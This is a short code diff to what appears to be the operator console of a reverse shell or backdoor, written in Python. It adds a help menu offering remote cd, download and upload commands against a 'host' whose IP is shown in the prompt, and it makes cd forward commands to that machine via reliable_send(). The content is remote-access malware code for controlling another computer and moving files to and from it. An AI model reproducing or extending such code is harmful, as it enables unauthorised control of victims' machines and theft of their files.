@@ -9,8 +9,11 @@ def shell():
         cmd = input("* Shell#~%s: " % str(ip))
         if cmd == "exit":
             break
+        elif cmd[:4] == "help":
+            print("Available functions: \ncd {path} - change host directory \ndownload {file} - Download a file from "
+                  "host \nupload {file} - Upload a file to the host")
         elif cmd[:2] == "cd" and len(cmd) > 1:
-            continue
+            reliable_send(cmd)
         elif cmd[:8] == "download":
             download(cmd)
         elif cmd[:6] == "upload":
